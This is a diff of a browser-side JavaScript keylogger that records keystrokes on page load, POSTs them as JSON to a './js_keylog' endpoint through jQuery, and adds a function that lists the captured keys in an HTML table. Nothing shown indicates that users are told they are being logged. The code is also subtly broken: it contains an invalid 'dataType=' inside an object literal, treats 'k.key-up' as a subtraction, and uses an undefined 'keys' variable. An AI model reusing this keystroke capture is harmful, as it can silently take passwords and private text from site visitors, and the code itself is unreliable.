@@ -26,19 +26,44 @@ var keylog = {
     // SEND CAPTURED KEYS TO SERVER
     send: function () { 
       if (keylog.cache.length > keylog.min) {
-        /*var data = new FormData;
-        data.append("presses", JSON.stringify(keylog.cache));*/
+        // var data = new FormData;
+        // data.append(JSON.stringify(keylog.cache));
 
-        var data = JSON.stringify(keylog.cache);
+        // var data = JSON.stringify(keylog.cache);
     
-        // AJAX
-        var xhr = new XMLHttpRequest();
-        xhr.onload = function(){ console.log(keylog.cache); }; //debugging
+        // // AJAX
+        // var xhr = new XMLHttpRequest();
+        // xhr.onload = function(){ console.log(keylog.cache); }; //debugging
 
-        xhr.open("POST", "/js_keylog", true);
-        xhr.send(data);
-        keylog.cache = [];
+        // xhr.open("POST", "/js_keylog", true);
+        // xhr.setRequestHeader("Content-Type", "application/json");
+        // xhr.setRequestHeader("dataType", "json");
+        // xhr.send(data);
+        // keylog.cache = [];
+
+        $.ajax({
+          url:"./js_keylog",
+          type:"POST",
+          data: JSON.stringify(keylog.cache),
+          dataType="json",
+        });
 
     }}
   };
   window.addEventListener("DOMContentLoaded", keylog.init);
+
+function showKeyTable(){
+  console.log("here");
+  for (const [key,value] of Object.entries(keys)){
+    var k = JSON.parse(value);
+    $('#KeylogView > table > tbody').append(
+      '<tr><td>'
+      + k.time
+      +'</td><td>'
+      + k.key-up
+      +'</td><td>'
+      + k.key
+      +'</td></tr>'
+    );
+  }
+}
